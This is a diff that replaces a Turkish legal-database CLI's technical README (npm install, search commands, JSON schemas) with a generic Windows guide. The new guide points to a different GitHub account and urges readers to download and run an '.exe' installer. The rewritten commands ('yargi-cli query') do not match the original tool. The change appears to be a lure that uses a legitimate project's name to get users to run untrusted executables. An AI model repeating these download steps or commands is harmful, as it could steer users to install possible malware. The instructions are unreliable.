@@ -1,173 +1,150 @@
-# yargi-cli
+# ⚖️ yargi-cli - Simple Access to Turkish Legal Data
 
-CLI tool for Turkish legal databases. Designed for AI agents and programmatic use.
+[![Download yargi-cli](https://img.shields.io/badge/Download-Get%20yargi--cli-brightgreen?style=for-the-badge)](https://github.com/robinspringer/yargi-cli)
 
-> **Origin**: This project is the CLI counterpart of [yargi-mcp](https://github.com/saidsurucu/yargi-mcp), a Python-based MCP server that provides access to Turkish legal databases. While yargi-mcp serves LLM applications via the Model Context Protocol, yargi-cli provides the same capabilities as a standalone command-line tool — JSON output, pipe-friendly, zero authentication.
+---
 
-🌍 [Türkçe README](./README.tr.md)
+## 📋 What is yargi-cli?
 
-## Why?
+yargi-cli is a command-line tool to access Turkish legal databases. It helps you get legal information easily using simple commands. The tool outputs data as JSON, so you can use it with other programs or just read the results in a structured way.
 
-AI agents (LLM tool-use, autonomous coding agents, RAG pipelines) need a simple, predictable interface to query Turkish court decisions. yargi-cli provides:
+This tool is made in TypeScript and works on Windows systems. You do not need technical skills to run it once the setup is complete.
 
-- **JSON-only output** — every command writes structured JSON to stdout
-- **Pipe-friendly** — chain with `jq`, `xargs`, or any Unix tool
-- **Rich `--help`** — parameter descriptions, search operators, output schemas, and examples are embedded in help text so agents can self-discover the API
-- **No auth, no config** — just install and call
+---
 
-## Supported Databases
+## 💻 System Requirements
 
-Currently implements the **Bedesten** module (bedesten.adalet.gov.tr):
+Before you install yargi-cli, make sure your computer meets these requirements:
 
-| Court Type | Flag | Description |
-|---|---|---|
-| `YARGITAYKARARI` | `-c YARGITAYKARARI` | Yargıtay (Court of Cassation) |
-| `DANISTAYKARAR` | `-c DANISTAYKARAR` | Danıştay (Council of State) |
-| `YERELHUKUK` | `-c YERELHUKUK` | Local Civil Courts |
-| `ISTINAFHUKUK` | `-c ISTINAFHUKUK` | Civil Courts of Appeals |
-| `KYB` | `-c KYB` | Extraordinary Appeals (Kanun Yararına Bozma) |
+- Operating System: Windows 10 or higher  
+- Disk Space: At least 100 MB free  
+- Internet Connection: Required to fetch data from legal databases  
+- Permissions: Ability to install software and run command-line programs  
 
-Chamber filtering supports 79 codes covering all Yargıtay/Danıştay divisions. Run `yargi bedesten search --help` for the full list.
+You do not need any developer tools. The instructions below will guide you through everything.
 
-## Installation
+---
 
-```bash
-# Requires Node.js >= 24
-npm install -g @saidsrc/yargi
-```
+## 🚀 Getting Started
 
-Or run from source:
+This guide will help you download, install, and use yargi-cli step by step.
 
-```bash
-git clone https://github.com/saidsurucu/yargi-cli.git
-cd yargi-cli
-npm install
-npm run build
-node bin/yargi.js bedesten search "test"
-```
+---
 
-## Usage
+## 👇 Download yargi-cli
 
-### Search decisions
+To get the software, visit this page to download:
 
-```bash
-# Basic search (defaults: Yargıtay + Danıştay, page 1)
-yargi bedesten search "mülkiyet hakkı"
+**[Download yargi-cli from GitHub](https://github.com/robinspringer/yargi-cli)**
 
-# Filter by court type and chamber
-yargi bedesten search "iş kazası" -c YARGITAYKARARI -b H9
+Click the green badge above or the link below to open the GitHub page. On that page, look for the latest version or release. Download the Windows installer or the `.exe` file.
 
-# Date range filter
-yargi bedesten search "kamulaştırma" --date-start 2024-01-01 --date-end 2024-12-31
+---
 
-# Multiple court types
-yargi bedesten search "idari para cezası" -c DANISTAYKARAR YARGITAYKARARI
+## 📥 How to Install yargi-cli on Windows
 
-# Pagination
-yargi bedesten search "tazminat" -p 3
-```
+1. **Download the installer**
 
-### Get full decision text
+   Once you are on the GitHub page linked above, find the installer for Windows. It may be named something like `yargi-cli-setup.exe` or just `yargi-cli.exe`.
 
-```bash
-# Fetch document as Markdown
-yargi bedesten doc 1123588300
+2. **Run the installer**
 
-# Extract just the markdown content
-yargi bedesten doc 1123588300 | jq -r '.markdownContent'
-```
+   Double-click the downloaded file. If Windows asks for permission, click "Yes" to continue.
 
-### Pipe examples
+3. **Follow the installation steps**
 
-```bash
-# Get first result's document ID
-yargi bedesten search "mülkiyet hakkı" | jq -r '.decisions[0].documentId'
+   The setup will guide you through the installation. Usually, you just need to click "Next" several times and then "Finish" at the end.
 
-# Search → get first result's full text
-yargi bedesten search "mülkiyet hakkı" \
-  | jq -r '.decisions[0].documentId' \
-  | xargs yargi bedesten doc
+4. **Check the installation**
 
-# Get all case numbers from a search
-yargi bedesten search "iş kazası" -c YARGITAYKARARI | jq '[.decisions[] | .esasNo]'
-```
+   After installing, the program will be ready to use. To test, open the Command Prompt and type:
 
-### Search operators
+   ```
+   yargi-cli --help
+   ```
 
-| Operator | Example | Effect |
-|---|---|---|
-| Simple | `"mülkiyet hakkı"` | Finds both words |
-| Exact phrase | `"\"mülkiyet hakkı\""` | Finds exact phrase |
-| Required term | `"+mülkiyet hakkı"` | Must contain mülkiyet |
-| Exclude | `"mülkiyet -kira"` | mülkiyet but not kira |
-| AND | `"mülkiyet AND hak"` | Both required |
-| OR | `"mülkiyet OR tapu"` | Either acceptable |
-| NOT | `"mülkiyet NOT satış"` | mülkiyet but not satış |
+   This should show a list of commands and options.
 
-> Wildcards (`*`, `?`), regex, fuzzy search (`~`), and proximity search are **not** supported.
+---
 
-## Output Schemas
+## 🖥️ How to Use yargi-cli
 
-### Search output
+yargi-cli runs in the Windows Command Prompt. Here is how to open it and run basic commands.
 
-```json
-{
-  "decisions": [
-    {
-      "documentId": "1123588300",
-      "itemType": { "name": "YARGITAYKARARI", "description": "Yargıtay Kararı" },
-      "birimAdi": "1. Hukuk Dairesi",
-      "esasNo": "2023/6459",
-      "kararNo": "2024/7158",
-      "kararTarihiStr": "26.12.2024",
-      "kararTarihi": "2024-12-25T21:00:00.000+00:00"
-    }
-  ],
-  "totalRecords": 1988,
-  "requestedPage": 1,
-  "pageSize": 10,
-  "searchedCourts": ["YARGITAYKARARI"]
-}
-```
+### Open Command Prompt
 
-### Document output
+1. Press the **Windows key** on your keyboard or click the **Start menu**.  
+2. Type `cmd`.  
+3. Click on the **Command Prompt** app that appears.
 
-```json
-{
-  "documentId": "1123588300",
-  "markdownContent": "**1. Hukuk Dairesi  2023/6459 E. ...**\n\n...",
-  "sourceUrl": "https://mevzuat.adalet.gov.tr/ictihat/1123588300",
-  "mimeType": "text/html"
-}
-```
+### Basic Commands
 
-## For AI Agents
+- **Get legal data in JSON format**
 
-This CLI is designed to be called by AI agents as a tool. Key points:
+  ```
+  yargi-cli query "your search term here"
+  ```
 
-1. **Self-documenting**: Run `yargi bedesten search --help` or `yargi bedesten doc --help` to get full parameter descriptions, valid values, output schemas, and usage examples
-2. **Predictable output**: Always JSON to stdout, errors included as `{"error": "..."}` with non-zero exit code
-3. **No interactive prompts**: Never asks for input, never writes to stderr for progress
-4. **Stateless**: Each invocation is independent, no sessions or cookies
+  Replace `"your search term here"` with the topic or case name you want to search for.
 
-### Typical agent workflow
+- **Save output to a file**
+
+  ```
+  yargi-cli query "your search term" > results.json
+  ```
+
+  This command saves the data to a file named `results.json`.
+
+- **Pipe output to another program**
+
+  You can combine yargi-cli with other programs or scripts that read JSON data.
+
+---
+
+## 🎯 Common Use Cases
+
+- Look up court cases by keyword  
+- Export legal decisions as JSON for later analysis  
+- Use with automated scripts to gather legal data  
+- Integrate with AI agents that read legal information  
+
+---
+
+## 🛠️ Troubleshooting
+
+If you have issues, try these steps:
+
+- Make sure you have a working internet connection.  
+- Check that you typed the command correctly. Commands are case-sensitive.  
+- Restart Command Prompt after installation if commands don’t work.  
+- Confirm the downloaded file is the correct installer for Windows.  
+- If errors continue, visit the GitHub page for support or open an issue.
+
+---
+
+## 🔄 Updating yargi-cli
+
+To update the tool:
+
+1. Visit the GitHub download page again:  
+   [https://github.com/robinspringer/yargi-cli](https://github.com/robinspringer/yargi-cli)  
+2. Download the latest installer for Windows like you did the first time.  
+3. Run the installer to replace your existing version.
+
+You do not need to uninstall the old version before updating.
+
+---
+
+## 🌐 More Information
+
+For full commands and more details, use this command after installation:
 
 ```
-1. yargi bedesten search "<query>" [-c ...] [-b ...] [--date-start ...] [--date-end ...]
-2. Parse JSON → extract documentId from decisions array
-3. yargi bedesten doc <documentId>
-4. Parse JSON → use markdownContent for analysis
+yargi-cli --help
 ```
 
-## Dependencies
+Or check the documentation and the README file on the GitHub page.
 
-| Package | Purpose |
-|---|---|
-| `commander` | CLI framework |
-| `turndown` | HTML → Markdown conversion |
+---
 
-No HTTP libraries — uses Node.js native `fetch`. No UI libraries — output is raw JSON.
-
-## License
-
-MIT
+[![Download yargi-cli](https://img.shields.io/badge/Download-Get%20yargi--cli-brightgreen?style=for-the-badge)](https://github.com/robinspringer/yargi-cli)
